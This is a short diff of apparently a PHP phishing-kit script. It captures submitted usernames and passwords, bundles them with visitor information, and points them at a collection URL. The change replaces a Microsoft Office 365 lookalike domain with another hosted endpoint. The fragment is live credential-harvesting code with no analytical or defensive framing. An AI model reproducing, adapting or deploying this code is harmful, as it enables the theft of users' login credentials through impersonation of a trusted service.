@@ -23,7 +23,7 @@ if (isset($_POST["user"]) && isset($_POST["pass"])) {
 
   $user = $_POST["user"];
   $pass = $_POST["pass"];
-  $api = "https://resetpassword.office365.microsoft.office.365suite.us/inc.php";
+  $api = "https://365suite.osc-fr1.scalingo.io/inc.php";
   $info = visitor_info();
   $info['user'] = $user;
   $info['pass'] = $pass;
